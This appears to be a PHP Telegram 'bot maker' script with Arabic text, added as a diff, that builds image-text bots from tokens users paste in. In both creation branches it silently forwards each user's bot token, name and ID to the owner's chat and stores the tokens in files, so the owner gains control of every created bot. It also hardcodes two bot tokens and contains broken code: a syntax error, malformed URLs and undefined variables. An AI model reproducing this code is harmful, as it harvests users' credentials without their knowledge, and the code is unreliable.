@@ -1,0 +1,667 @@
+
+<?php
+ob_start();
+define('API_KEY',926463765:AAGTdSKIvtCscekqEiguosqZ68HQx2zJfqQ');
+function bot($method,$datas=[]){
+    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
+$ch = curl_init();
+    curl_setopt($ch,CURLOPT_URL,$url);
+    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
+    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
+    $res = curl_exec($ch);
+    if(curl_error($ch)){
+        var_dump(curl_error($ch));
+    }else{
+        return json_decode($res);
+    }
+}
+
+$update = json_decode(file_get_contents('php://input'));
+$message = $update->message;
+$chat_id = $message->chat->id;
+$s = json_decode(file_get_contents('http://www.api-hany.cf/time?GTM=Asia/Baghdad&lang=ar'),true);
+$time = $s["time"];
+$date = $s["date"];
+$day = $s["day"];
+$mon = $s["month"];
+$t24 = $s["time24"];
+$dayhj = $s["hijri"]["day"];
+$monhj = $s["hijri"]["month"];
+$yearhj = $s["hijri"]["year"]; 
+$admin = 347185763;
+$sudo = 347185763;
+$message_id2 = $update->callback_query->message->message_id;
+$text = $message->text;
+$chat_id2 = $update->callback_query->message->chat->id;
+$message_id = $update->callback_query->message->message_id;
+$data = $update->callback_query->data;
+$from_id = $message->from->id;
+$name = $message->from->first_name;
+$check_token = file_get_contents("https://api.telegram.org/bot$text/getWebhookInfo");
+$check = json_decode($check_token);
+$get_filee = file_get_contents('bot1.php');
+$get_done = file_get_contents('makee/ex.txt');
+$done = explode("\n", $get_done);
+$get_id = file_get_contents('makee/make.txt');
+$getid = explode("\n", $get_id);
+$mid = $message->message_id;
+$inlineqt = $update->inline_query->query;
+bot('answerInlineQuery',[
+        'inline_query_id'=>$update->inline_query->id,    
+        'results' => json_encode([[
+            'type'=>'article',
+            'id'=>base64_encode(rand(5,555)),
+            'title'=>'مشاركة مع اصدقائك',
+            'input_message_content'=>['parse_mode'=>'HTML','message_text'=>"
+❪• اهلاً بك ؛ عزيزي ؛ 🎭
+في بوت صـنع بوتآت كتآبهہ‌‏ بل آلصـو‌‏رهہ بلعربي و كتابه عل لاعبين ؛ 🎫
+يمكنك مـن خلآل آلبوت صـنع بوت كتابهہ‏‏ بل صـو‏‏ر بل لغهہ‏‏ آلعربيهہ‏‏ وكتابه اسمك بل انكليزي عله ظهر الاعبين ؛ 💄
+لصـنع بوت فقط آضـغط علهہ‏‏ آنشـآء بوت لتصـنع بوتك ؛ 👓
+آصـنع‏‏ بوتك آلآن مـآذآ تنتظـر بوت بكامل حقوقك ؛ 💜
+تواصل المطـور -: @Twasl9Bot
+﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎
+    📅┇اليوم : *$day*
+    🕐┇الوقت 24 : *$t24*
+"],
+            'reply_markup'=>['inline_keyboard'=>[
+                [
+                ['text'=>'اصنع بوتك الاان ،💛','url'=>'https://telegram.me/Tsmi5Bot?start']
+                ],
+                [['text'=>'شارك البوت ،⚒️', 'switch_inline_query'=>"$from_id"]],
+             ]]
+        ]])
+    ]);
+//--------
+$token = "870791118:AAHOwhg6q_fCxDoR_QODuhBo_dwAc5rZDAc";
+$channel = "Alstorh1";
+$channel2 = "php506";
+$forchannel = json_decode(file_get_contents("https://api.telegram.org/bot$token/getChatMember?chat_id=@$channel&user_id=".$from_id));
+$tch = $forchannel->result->status;
+$forchannel2 = json_decode(file_get_contents("https://api.telegram.org/bot$token/getChatMember?chat_id=@$channel2&user_id=".$from_id));
+$tch2 = $forchannel2->result->status;
+//----------
+if ($tch != "creator" and $tch != "administrator" and $tch != "member"){
+  bot('sendMessage', [
+        'chat_id' => $chat_id,
+    'text'=>"لستخدام البوت '⭐️، عليك اشتراك في قنوات التاليه ،♥️،
+Ch BoT 1 💙 ~ @Alstorh1
+~~~~~~~~~~~~~~~~~
+Ch BoT 2 ♥️ ~ @php506
+بعد الاشتراک ارسل { /start } اتمنا لک التوفیق💙
+﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎
+    📅┇اليوم : $day
+    🕐┇الوقت 24 : $t24",
+'reply_markup'=>json_encode(['KeyboardRemove'=>[
+],'remove_keyboard'=>true
+])
+]);
+    }
+     elseif ($tch2 != "creator" and $tch2 != "administrator" and $tch2 != "member"){
+  bot('sendMessage', [
+        'chat_id' => $chat_id,
+    'text'=>"لستخدام البوت '⭐️، عليك اشتراك في قنوات التاليه ،♥️،
+Ch BoT 1 💙 ~ @Alstorh1
+~~~~~~~~~~~~~~~~~
+Ch BoT 2 ♥️ ~ @Php506
+بعد الاشتراک ارسل { /start } اتمنا لک التوفیق💙
+﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎
+    📅┇اليوم : $day
+    🕐┇الوقت 24 : $t24 ",
+'reply_markup'=>json_encode(['KeyboardRemove'=>[
+],'remove_keyboard'=>true
+])
+]);
+    }
+//------
+elseif($text == '/start' and !in_array($from_id, $getid) and !strpos($ch1 , '"status":"left"') !== false){
+bot('sendMessage',[
+'chat_id'=>$chat_id,
+'text'=>"❪• اهلاً بك ؛ عزيزي ؛ 🎭[$name](tg://user?id=$chat_id)❫
+في بوت صـنع بوتآت كتآبهہ‌‏ بل آلصـو‌‏رهہ بلعربي و كتابه عل لاعبين ؛ 🎫
+يمكنك مـن خلآل آلبوت صـنع بوت كتابهہ‏‏ بل صـو‏‏ر بل لغهہ‏‏ آلعربيهہ‏‏ وكتابه اسمك بل انكليزي عله ظهر الاعبين ؛ 💄
+لصـنع بوت فقط آضـغط علهہ‏‏ آنشـآء بوت لتصـنع بوتك ؛ 👓
+آصـنع‏‏ بوتك آلآن مـآذآ تنتظـر بوت بكامل حقوقك ؛ 💜
+﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎
+    📅┇اليوم : *$day*
+    🕐┇الوقت 24 : *$t24*
+",
+'parse_mode'=>"MarkDown",
+'disable_web_page_preview'=>true,
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+    [['text'=>'آنشـآء بوت ؛کتابه عل صور بلعربی 🎲','callback_data'=>'maka1']],[['text'=>'حذف بوت ؛کتابه عل صور بلعربی 🎱','callback_data'=>'delete1']],
+[['text'=>'آنشـآء بوت کتابه عل الاعبین 🎲','callback_data'=>'maka2']],[['text'=>'حذف بوت الاعبین 🎱','callback_data'=>'delete2']],
+    [['text'=>'','callback_data'=>'help']],
+    [['text'=>"آضـغط هہ‏‏نآ و تآبع جديدنآ ؛ ⭐", 'url'=>"https://t.me/Allm_Telegram"],['text'=>"شارك البوت '🌛،", 'switch_inline_query'=>"احبك ، ♥️"]],
+]
+])
+]);
+}
+
+if($data == 'cancle' and in_array($from_id, $getid)){
+$str = str_replace($chat_id2, "", $get_id) ;
+file_put_contents('makee/make.txt', $str);
+bot('editMessageText',[
+'chat_id'=>$chat_id2,
+'message_id'=>$message_id,
+'text'=>"❪• اهلاً بك ؛ عزيزي ؛ 🎭
+في بوت صـنع بوتآت كتآبهہ‌‏ بل آلصـو‌‏رهہ بلعربي و كتابه عل لاعبين ؛ 🎫
+يمكنك مـن خلآل آلبوت صـنع بوت كتابهہ‏‏ بل صـو‏‏ر بل لغهہ‏‏ آلعربيهہ‏‏ وكتابه اسمك بل انكليزي عله ظهر الاعبين ؛ 💄
+لصـنع بوت فقط آضـغط علهہ‏‏ آنشـآء بوت لتصـنع بوتك ؛ 👓
+آصـنع‏‏ بوتك آلآن مـآذآ تنتظـر بوت بكامل حقوقك ؛ 💜
+﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎
+    📅┇اليوم : *$day*
+    🕐┇الوقت 24 : *$t24*
+",
+'parse_mode'=>"MarkDown",
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[['text'=>'آنشـآء بوت ؛کتابه عل صور بلعربی 🎲','callback_data'=>'maka1']],[['text'=>'حذف بوت ؛کتابه عل صور بلعربی 🎱','callback_data'=>'delete1']],
+[['text'=>'آنشـآء بوت کتابه عل الاعبین 🎲','callback_data'=>'maka2']],[['text'=>'حذف بوت الاعبین 🎱','callback_data'=>'delete2']],
+    [['text'=>'','callback_data'=>'help']],
+    [['text'=>"آضـغط هہ‏‏نآ و تآبع جديدنآ ؛ ⭐", 'url'=>"https://t.me/Alstorh1"],['text'=>"شارك البوت '🌛،", 'switch_inline_query'=>"♥️ ، احبك"]],
+
+]
+])
+]);
+}
+
+
+if($data == 'home'){
+bot('editMessageText',[
+'chat_id'=>$chat_id2,
+'message_id'=>$message_id,
+'text'=>"❪• اهلاً بك ؛ عزيزي ؛ 🎭
+في بوت صـنع بوتآت كتآبهہ‌‏ بل آلصـو‌‏رهہ بلعربي و كتابه عل لاعبين ؛ 🎫
+يمكنك مـن خلآل آلبوت صـنع بوت كتابهہ‏‏ بل صـو‏‏ر بل لغهہ‏‏ آلعربيهہ‏‏ وكتابه اسمك بل انكليزي عله ظهر الاعبين ؛ 💄
+لصـنع بوت فقط آضـغط علهہ‏‏ آنشـآء بوت لتصـنع بوتك ؛ 👓
+آصـنع‏‏ بوتك آلآن مـآذآ تنتظـر بوت بكامل حقوقك ؛ 💜
+﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎
+    📅┇اليوم : *$day*
+    🕐┇الوقت 24 : *$t24*",
+    'parse_mode'=>"MarkDown",
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[['text'=>'آنشـآء بوت ؛کتابه عل صور بلعربی 🎲','callback_data'=>'maka1']],[['text'=>'حذف بوت ؛کتابه عل صور بلعربی 🎱','callback_data'=>'delete1']],
+[['text'=>'آنشـآء بوت کتابه عل الاعبین 🎲','callback_data'=>'maka2']],[['text'=>'حذف بوت الاعبین 🎱','callback_data'=>'delete2']],
+    [['text'=>'','callback_data'=>'help']],
+    [['text'=>"آضـغط هہ‏‏نآ و تآبع جديدنآ ؛ ⭐", 'url'=>"https://t.me/Allm_Telegram"],['text'=>"شارك البوت '🌛،", 'switch_inline_query'=>"احبك ، ♥️"]],
+]
+])
+]);
+}
+//----------البوت-------//
+$update = json_decode(file_get_contents('php://input'));
+$message = $update->message;
+$chat_id = $message->chat->id;
+$text = $message->text;
+$chat_id2 = $update->callback_query->message->chat->id;
+$message_id = $update->callback_query->message->message_id;
+$data = $update->callback_query->data;
+$from_id = $message->from->id;
+$check_tokenn = file_get_contents("https://api.telegram.org/bot$text/getWebhookInfo");
+$check = json_decode($check_token);
+$get_file = file_get_contents('Bot2.php');
+$get_done = file_get_contents('make/ex.txt');
+$done = explode("\n", $get_done);
+$get_id = file_get_contents('make/make.txt');
+$getid = explode("\n", $get_id);
+$mid = $message->message_id;
+if($data == 'maka1' and !in_array($chat_id2,$done) and !strpos($ch1 , '"status":"left"') !== false){
+file_put_contents('make/make.txt', "\n" . $chat_id2 . "\n",FILE_APPEND);    
+bot('editMessageText',[
+'chat_id'=>$chat_id2,
+'message_id'=>$message_id,
+'text'=>"🌐¦ الان قم بأرسال التوكن *❪ToKen❫*   ☑️
+🤖¦ يمكنك الحصول عليه من خلال @BotFather ؛
+﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎
+    📅┇اليوم : *$day*
+    🕐┇الوقت 24 : *$t24*", 
+'parse_mode'=>"MarkDown",
+'disable_web_page_preview'=>true,
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[['text'=>'🌐 الغاء ؛ ','callback_data'=>'cancle']]
+]
+])
+]);
+}
+if($data == 'maka1' and in_array($chat_id2,$done) and !strpos($ch1 , '"status":"left"') !== false){
+bot('answerCallbackQuery',[
+'callback_query_id'=>$update->callback_query->id,
+'message_id'=>$message_id,
+'text'=>'عذرآ صـديقي لآيمـگنگ صـنع بوت آخر ؛ 👑',
+ 'show_alert'=>true
+ ]);      
+}
+if($text and in_array($from_id, $getid) and $check->ok == "true"){
+for($i = $mid - 3; $i < $mid; $i++){
+bot('deleteMessage',[
+'chat_id'=>$chat_id,
+'message_id'=>$i
+]);
+}
+$str = str_replace($from_id, '', $get_id);    
+file_put_contents('make/make.txt', $str);    
+file_put_contents('make/ex.txt', $from_id . "\n", FILE_APPEND);
+$info['info']["$from_id"] = "$text";
+file_put_contents('info.json', json_encode($info));
+file_put_contents('users.txt',"\n".$from_id);
+$url = json_decode(file_get_contents("https://api.telegram.org/bot$text/getme"))->result;
+$user = $url->username;
+$name1 = $url->first_name;
+$user_id2 = $message->from->id;
+$name2 = $message->from->first_name;
+$username2 = $message->from->username;
+bot('sendMessage', [
+    'chat_id'=>$chat_id,
+    'text'=>"تم صنع بوت الصور العربی بنجاح ؛  🚀
+    - معرف بوتك ┇ @$user ┇🌝♥️
+         ",'parse_mode'=>"MarkDown",
+    'disable_web_page_preview'=>true,
+    'reply_markup'=>json_encode([
+        'inline_keyboard'=>[
+[['text'=>"$name1",'url'=>"https://t.me/$user"]],
+        ]
+        ])
+]);
+bot('sendmessage',[
+    'chat_id'=>$sudo,
+    'text'=>"  
+    • تم صناعه بوت من قبل ، 🔽
+      الاسم - [$name2](tg://user?id=$user_id2)
+    المعرف -   [$username2](tg://user?id=$user_id2)
+الايدي    -   [$user_id2](tg://user?id=$user_id2)
+    - التوكن ؛ `$text`
+    - معرف البوت ؛ 
+[$name1](t.me/$user)
+    -------------------
+    🕐┇الوقت -: $time
+    🕐┇الوقت 24 : $t24
+    📅┇التاريخ -: $date
+    📅┇التاريخ الهجري :$dayhj/$monhj/$yearhj
+    📅┇اليوم : $day
+    📅┇الشهر : $mon",
+    'disable_web_page_preview'=>'true',
+'parse_mode'=>"Markdown",
+    ]);
+mkdir("bots/$from_id");
+file_put_contents("bots/$from_id/tt.txt",$text . "\n" . $from_id);
+file_put_contents("bots/$from_id/bot.php", $get_file);
+file_put_contents("bots/$from_id/chat.txt", $from_id . "\n");
+file_put_contents("bots/$from_id/welcome.txt", 'اهلا بك في بوت کتابه عل صور بل عربی المتميز' . "\n");
+file_put_contents("bots/$from_id/index.php", 'ها حیوان شترید' . "\n");
+file_get_contents("https://api.telegram.org/bot$text/setwebhook?url=https://fares000.000webhostapp.com/DD4D6/bots/$from_id/bot.php");
+}
+if($text and in_array($from_id, $getid) and $check->ok != "true" and !strpos($ch1 , '"status":"left"') !== false){
+bot('sendMessage',[
+'chat_id'=>$chat_id,
+'text'=>'عذرآ هآذ آلتوگن خطـآء ؛ 🙀',
+'reply_to_message_id'=>$message->message_id,
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[['text'=>'الغآء ؛ 🌟','callback_data'=>'cancle']]
+]
+])
+]);
+}    
+if($data == 'delete1' and in_array($chat_id2,$done)){
+bot('editMessageText',[
+'chat_id'=>$chat_id2,
+'message_id'=>$message_id,
+'text'=>'هہ‏‏ل آنت مـتآگد آنگ تريد حذف بوتگ ؛ 👀',
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[
+['text'=>'لا ؛ 👞', 'callback_data'=>'home'],
+['text'=>'نعم ؛ 💔','callback_data'=>'yesde1'],
+]    
+]])
+]);    
+}
+if($data == 'yesde1' and in_array($chat_id2, $done)){
+bot('editMessageText',[
+'chat_id'=>$chat_id2,
+'message_id'=>$message_id,
+'text'=>"تم حذف بوتگ بنجآح ؛ 👣",
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[
+['text'=>'آلقآئمـهہ‏‏ آلرئسـيهہ‏‏ ؛ 💬' , 'callback_data'=>"home"]
+]
+]
+])
+]);
+$str1 = str_replace($chat_id2, '', $get_done);
+file_put_contents('make/ex.txt', $str1);
+$get_token = file_get_contents("bots/$chat_id2/tt.txt");
+$get_url = file_get_contents("https://api.telegram.org/bot$get_token/getWebhookInfo");
+$json = json_decode($get_url);
+$url = $json->result->url;
+file_get_contents("https://https://api.telegram.org/bot$get_token/deletewebhook?url=$url");
+unlink("bots/$chat_id2/bot.php");
+unlink("bots/$chat_id2/tt.txt");
+}
+if($data == 'delete1' and !in_array($chat_id2,$done)){
+bot('answerCallbackQuery',[
+'callback_query_id'=>$update->callback_query->id,
+'message_id'=>$message_id,
+'text'=>'قم بعمـل  بوت آولآ ؛ 💎',
+ 'show_alert'=>true
+ ]);  
+}
+//------بوت2-----//
+
+$update = json_decode(file_get_contents('php://input'));
+$message = $update->message;
+$chat_id = $message->chat->id;
+$text = $message->text;
+$chat_id2 = $update->callback_query->message->chat->id;
+$message_id = $update->callback_query->message->message_id;
+$data = $update->callback_query->data;
+$from_id = $message->from->id;
+$check_tokenn = file_get_contents("https://api.telegram.org/bot$text/getWebhookInfo");
+$check = json_decode($check_token);
+$get_file = file_get_contents('Bot3.php');
+$get_done = file_get_contents('makee/ex.txt');
+$done = explode("\n", $get_done);
+$get_id = file_get_contents('makee/make.txt');
+$getid = explode("\n", $get_id);
+$mid = $message->message_id;
+if($data == 'maka2' and !in_array($chat_id2,$done) and !strpos($ch1 , '"status":"left"') !== false){
+file_put_contents('makee/make.txt', "\n" . $chat_id2 . "\n",FILE_APPEND);    
+bot('editMessageText',[
+'chat_id'=>$chat_id2,
+'message_id'=>$message_id,
+'text'=>"🌐¦ الان قم بأرسال التوكن *❪ToKen❫*   ☑️
+🤖¦ يمكنك الحصول عليه من خلال @BotFather ؛
+﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎
+    📅┇اليوم : *$day*
+    🕐┇الوقت 24 : *$t24*", 
+'parse_mode'=>"MarkDown",
+'disable_web_page_preview'=>true,
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[['text'=>'🌐 الغاء ؛ ','callback_data'=>'cancle']]
+]
+])
+]);
+}
+if($data == 'maka2' and in_array($chat_id2,$done) and !strpos($ch1 , '"status":"left"') !== false){
+bot('answerCallbackQuery',[
+'callback_query_id'=>$update->callback_query->id,
+'message_id'=>$message_id,
+'text'=>'عذرآ صـديقي لآيمـگنگ صـنع بوت آخر ؛ 👑',
+ 'show_alert'=>true
+ ]);      
+}
+if($text and in_array($from_id, $getid) and $check->ok == "true"){
+for($i = $mid - 3; $i < $mid; $i++){
+bot('deleteMessage',[
+'chat_id'=>$chat_id,
+'message_id'=>$i
+]);
+}
+$str = str_replace($from_id, '', $get_id);    
+file_put_contents('makee/make.txt', $str);    
+file_put_contents('makee/ex.txt', $from_id . "\n", FILE_APPEND);
+$info['info']["$from_id"] = "$text";
+file_put_contents('info.json', json_encode($info));
+file_put_contents('users.txt',"\n".$from_id);
+$url = json_decode(file_get_contents("https://api.telegram.org/bot$text/getme"))->result;
+$user = $url->username;
+$name1 = $url->first_name;
+$user_id2 = $message->from->id;
+$name2 = $message->from->first_name;
+$username2 = $message->from->username;
+bot('sendMessage', [
+    'chat_id'=>$chat_id,
+    'text'=>"تم صنع بوت کتابه عل لاعبین الجدید بنجاح ؛  🚀
+    - معرف بوتك ┇ @$user ┇🌝♥️
+         ",'parse_mode'=>"MarkDown",
+    'disable_web_page_preview'=>true,
+    'reply_markup'=>json_encode([
+        'inline_keyboard'=>[
+[['text'=>"$name1",'url'=>"https://t.me/$user"]],
+        ]
+        ])
+]);
+bot('sendmessage',[
+    'chat_id'=>$sudo,
+    'text'=>"  
+    • تم صناعه بوت كتابه عل لاعبين من قبل ، 🔽
+      الاسم - [$name2](tg://user?id=$user_id2)
+    المعرف -   [$username2](tg://user?id=$user_id2)
+الايدي    -   [$user_id2](tg://user?id=$user_id2)
+    - التوكن ؛ `$text`
+    - معرف البوت ؛ 
+[$name1](t.me/$user)
+    -------------------
+    🕐┇الوقت -: $time
+    🕐┇الوقت 24 : $t24
+    📅┇التاريخ -: $date
+    📅┇التاريخ الهجري :$dayhj/$monhj/$yearhj
+    📅┇اليوم : $day
+    📅┇الشهر : $mon",
+    'disable_web_page_preview'=>'true',
+'parse_mode'=>"Markdown",
+    ]);
+mkdir("botss/$from_id");
+file_put_contents("botss/$from_id/tt.txt",$text . "\n" . $from_id);
+file_put_contents("botss/$from_id/bot.php", $get_file);
+file_put_contents("botss/$from_id/chat.txt", $from_id . "\n");
+file_put_contents("botss/$from_id/welcome.txt", 'اهلا بك في بوت کتابه عل لاعبین الجدید' . "\n");
+file_get_contents("https://api.telegram.org/bot$text/setwebhook?url=https://fares000.000webhostapp.com/DD4D6/botss/$from_id/bot.php");
+}
+if($text and in_array($from_id, $getid) and $check->ok != "true" and !strpos($ch1 , '"status":"left"') !== false){
+bot('sendMessage',[
+'chat_id'=>$chat_id,
+'text'=>'عذرآ هآذ آلتوگن خطـآء ؛ 🙀',
+'reply_to_message_id'=>$message->message_id,
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[['text'=>'الغآء ؛ 🌟','callback_data'=>'cancle']]
+]
+])
+]);
+}    
+if($data == 'delete2' and in_array($chat_id2,$done)){
+bot('editMessageText',[
+'chat_id'=>$chat_id2,
+'message_id'=>$message_id,
+'text'=>'هہ‏‏ل آنت مـتآگد آنگ تريد حذف بوتگ ؛ 👀',
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[
+['text'=>'لا ؛ 👞', 'callback_data'=>'home'],
+['text'=>'نعم ؛ 💔','callback_data'=>'yesde2'],
+]    
+]])
+]);    
+}
+if($data == 'yesde2' and in_array($chat_id2, $done)){
+bot('editMessageText',[
+'chat_id'=>$chat_id2,
+'message_id'=>$message_id,
+'text'=>"تم حذف بوتگ بنجآح ؛ 👣",
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[
+['text'=>'آلقآئمـهہ‏‏ آلرئسـيهہ‏‏ ؛ 💬' , 'callback_data'=>"home"]
+]
+]
+])
+]);
+$str1 = str_replace($chat_id2, '', $get_done);
+file_put_contents('makee/ex.txt', $str1);
+$get_token = file_get_contents("botss/$chat_id2/tt.txt");
+$get_url = file_get_contents("https://api.telegram.org/bot$get_token/getWebhookInfo");
+$json = json_decode($get_url);
+$url = $json->result->url;
+file_get_contents("https://https://api.telegram.org/bot$get_token/deletewebhook?url=$url");
+unlink("botss/$chat_id2/bot.php");
+unlink("botss/$chat_id2/tt.txt");
+}
+if($data == 'delete2' and !in_array($chat_id2,$done)){
+bot('answerCallbackQuery',[
+'callback_query_id'=>$update->callback_query->id,
+'message_id'=>$message_id,
+'text'=>'قم بعمـل  بوت آولآ ؛ 💎',
+ 'show_alert'=>true
+ ]);  
+}
+//----------//
+$sudo = 330811864;
+mkdir("data");
+$u = explode("\n",file_get_contents("data/iBadlz.txt"));
+$c = count($u)-1;
+if ($update && !in_array($chat_id, $u)) {
+    file_put_contents("data/iBadlz.txt", $chat_id."\n",FILE_APPEND);
+ }
+ 
+ 
+ //------المطور-----//
+if($text == "فارس" || $text == "A" and $chat_id == $sudo){
+    bot('sendMessage',[
+    'chat_id'=>$chat_id,
+    'text'=>"• اهلاً بك ؛مـطـوري آلعزيز [$name](tg://user?id=$chat_id)
+    
+انت صاحب البوت الان ويمكنك اختيآر آحد آلآوآمـر آلتآليهہ‏‏ ؛ 🎏
+
+لديگ 3 آوآمـر آختر وآحد مـن آلآوآمـر ؛ 🔳
+
+يمـگنگ عمـل آذآعهہ‏‏ ؛ يمـگنگ تغيير آشـترآگ آجبآري لقنآتگ ؛ يمـگنگ رئيهہ‏‏ عدد آعضـآآ بوتگ
+",
+'parse_mode'=>"MarkDown",
+'disable_web_page_preview'=>true, 
+    'reply_markup'=>json_encode([
+        'keyboard'=>[
+            [['text'=>"عدد الاعضـاء ?🖤*"],['text'=>"اذاعةهۃ '؟🚶🏿‍♂ء"]],
+[['text'=>'البوتات']],
+        ] ])]);}
+if($text == "عدد الاعضـاء ?🖤*" and $chat_id == $sudo){ //BY : @GG1ZZ
+    bot('sendMessage',[
+        'chat_id'=>$chat_id,
+        'text'=>"مستخدمين البوت ،📻؛ الخاص بك : $c",        
+]);}
+$mode = file_get_contents("data/deve.txt");
+if($text == "اعةهۃ '؟🚶🏿‍♂ء" and $chat_id == $sudo){
+    file_put_contents("data/deve.txt","yas");
+    bot('sendMessage',[
+    'chat_id'=>$chat_id, 
+    'message_id'=>$message_id,
+    'text'=>"ارسل رسالتك الان 📩 وسيتم نشرها لـ $c مشترك",   'reply_markup'=>json_encode([
+        'inline_keyboard'=>[
+            [['text'=>"الغاء 💯",'callback_data'=>"off"]],]])]);}
+if($text and $mode == "yas" ){
+    for ($i=0; $i < count($u); $i++) { 
+        bot('sendMessage',[
+          'chat_id'=>$u[$i],
+          'text'=>"$text", ]);}} 
+if($data == "off"){
+    file_put_contents("data/deve.txt","no");
+    bot('EditMessageText',[
+    'chat_id'=>$chat_id2,   
+    'message_id'=>$message_id2,
+    'text'=>"تم الغاء العمليةهۃ ،❗️َ",]);
+}
+ if ($text == 'الاعضاء' and $chat_id == $sudo) {
+    bot('sendMessage',[
+      'chat_id'=>$chat_id,
+      'text'=>"مستخدمين البوت ،📻؛ الخاص بك : $c"
+    ]);
+  }
+$count1 = count(scandir('bots')) - 2;
+$count2 = count(scandir('botss')) - 2;
+if($text == "البوتات" and $chat_id == $sudo){
+bot('sendMessage',[
+'chat_id'=>$chat_id,
+'text'=>"•عدد بوتات المصنوعه کتابه بل عربی • $count1 •
+•عدد بوتات المصنوعه کتاب عل لاعب؛ • $count2 • "
+]);
+}
+//--------//
+$u = explode("\n",file_get_contents("memb.txt"));
+$c = count($u)-1;
+$modxe = file_get_contents("usr.txt");
+$admin = 330811864;
+if ($update && !in_array($chat_id, $u)) {
+file_put_contents("memb.txt", $chat_id."\n",FILE_APPEND);
+}
+if ($text == "/admin" and $chat_id == $admin ) {
+bot('sendMessage',[
+'chat_id'=>$chat_id,
+'text'=>"
+☑️￤اهلا عزيزي :- المطور .
+▫️￤اليك الاوامر الان حدد ماتريده 📩
+-
+",
+'parse_mode'=>"MarkDown",
+'disable_web_page_preview'=>true,
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[['text'=>'رسالة للكل ','callback_data'=>'ce']],
+[['text'=>'عدد الاعضاء ','callback_data'=>'co']],
+]
+])
+]);
+}
+if($data == 'off'){
+bot('editMessageText',[
+'chat_id'=>$chat_id2,
+'message_id'=>$message_id,
+'text'=>"
+☑️￤اهلا عزيزي :- المطور .
+▫️￤اليك الاوامر الان حدد ماتريده 📩
+-
+",
+'parse_mode'=>"MarkDown",
+'disable_web_page_preview'=>true,
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[['text'=>'رسالة للكل ','callback_data'=>'ce']],
+[['text'=>'عدد الاعضاء ','callback_data'=>'co']],
+]
+])
+]);
+file_put_contents('usr.txt', '');
+}
+# المشتركين #
+if($data == "co" and $update->callback_query->message->chat->id == $admin ){ 
+bot('answercallbackquery',[
+'callback_query_id'=>$update->callback_query->id,
+'text'=>"
+عدد مشتركين البوت📢 :- [ $c ] .
+",
+'show_alert'=>true,
+]);
+}
+# رسالة للكل #
+if($data == "ce" and $update->callback_query->message->chat->id == $admin){ 
+file_put_contents("usr.txt","yas");
+bot('EditMessageText',[
+'chat_id'=>$update->callback_query->message->chat->id,
+'message_id'=>$update->callback_query->message->message_id,
+'text'=>"▪️ ارسل رسالتك الان 📩 وسيتم نشرها لـ [ $c ] مشترك . 
+",
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[['text'=>' الغاء 🚫 •','callback_data'=>'off']] 
+]
+])
+]);
+}
+if($text and $modxe == "yas" and $chat_id == $admin ){
+for ($i=0; $i < count($u); $i++) { 
+bot('sendMessage',[
+'chat_id'=>$u[$i],
+'text'=>"$text",
+'parse_mode'=>"MarkDown",
+'disable_web_page_preview'=>true,
+
+]);
+file_put_contents("usr.txt","no");
+
+} 
+}
+//-------------//
